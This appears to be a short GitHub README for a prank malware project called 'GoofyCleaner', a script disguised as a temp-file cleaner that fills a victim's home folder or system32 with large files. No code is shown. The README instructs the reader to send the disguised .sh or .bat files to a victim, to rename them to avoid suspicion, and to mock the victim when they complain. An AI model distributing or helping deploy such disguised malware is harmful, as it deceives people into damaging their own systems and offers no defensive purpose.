# -Malware-GoofyCleaner
this incredibly simple malware poses as a tempfile cleaner but spams the victims ~/Home or system32 with large files <br>
INSTRUCTIONS:
Download the .zip or .tar.gz archive from the releases tab (this will not harm your computer automatically unless you execute the .sh or .bat files)<br>
send your victim "Instructions.txt" and (on linux)"SystemCleaner.sh" (on windows) "SystemCleaner.bat" you can rename these files as well<br>
after they complain to you over discord, text, or another chat application, carefully type the letters "c", "o", "p", and "e", then press the enter key<br>
the $x variable controls the amount of characters in each created file
